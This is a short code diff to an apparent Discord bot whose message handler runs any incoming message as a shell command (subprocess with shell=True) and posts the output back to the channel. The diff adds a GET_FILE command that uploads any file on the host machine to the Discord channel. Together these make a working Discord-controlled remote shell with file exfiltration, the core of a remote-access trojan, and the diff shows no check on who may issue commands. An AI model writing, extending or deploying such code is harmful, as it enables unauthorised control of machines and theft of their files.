@@ -25,6 +25,19 @@ async def on_message(message):
 
         print("Command: " + command)
 
+
+        if command.startswith("GET_FILE: "):
+            await message.channel.send ("Getting file")
+            filePath = command[10:]
+
+            try: 
+                await message.channel.send(file=discord.File(filePath))
+            except: 
+                await message.channel.send("Error retrieving file: " + filePath)
+            
+
+            return 
+
         # I wan't to find a better way of doing this. It has some issues 
         result = subprocess.check_output(command, shell=True, text=True)
 
@@ -33,6 +46,8 @@ async def on_message(message):
             return 
             
         await message.channel.send(result)
+
+       
 
 
         
